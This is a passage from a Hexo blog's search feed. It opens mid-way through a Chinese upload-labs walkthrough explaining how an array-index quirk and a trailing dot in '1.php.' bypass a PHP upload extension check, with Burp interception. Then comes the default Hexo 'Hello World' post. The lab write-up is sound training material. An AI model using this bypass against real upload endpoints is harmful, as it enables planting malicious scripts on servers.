1]位置count($file)的值为3，因为有三个有实值数组元素</span><br><span class="hljs-comment">所以[$file[count($file) - 1]的值为2，然而$file[2]=null,即我们拿到的$file_name就是$file[0]=1.php再加个&#x27;.&#x27;,但在服务器会自动把&#x27;.&#x27;去除,所以我们成功绕过了检测</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">根据以上思路我们有如下解题方法</span><br><span class="hljs-comment">//保存名字写&#x27;1.php&#x27;,用bp抓包上传，改包成如下图所示，然后发包即可成功绕过</span><br></code></pre></td></tr></table></figure><p><img src="/images/1.png"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>因为笔记图片比较少，如果还有不太清楚的地方，可以参考的文章与视频推荐：</p><p><a href="https://blog.csdn.net/qq_53003652/article/details/129969951">CSDN博客:Upload-labs-pass 1-19关全解</a></p><p><a href="%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%EF%BC%88upload-labs%EF%BC%89%E9%80%9A%E5%85%B3+%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%99%E7%A8%8B(pass1-21)2023%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%88%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%89%E3%80%91https://www.bilibili.com/video/BV1JG411Z7jN?p=27&vd_source=4b869c1246b9bf7457a3d4494f7f69c7">b站:文件上传漏洞靶场通关+知识点教程 1-21</a>  tips:因为比我们的20关多一关，注意自己判别，可能会有关卡错位</p>]]></content>
    
    
    <categories>
      
      <category>web基础漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/04/02/hello-world/"/>
    <url>/2024/04/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
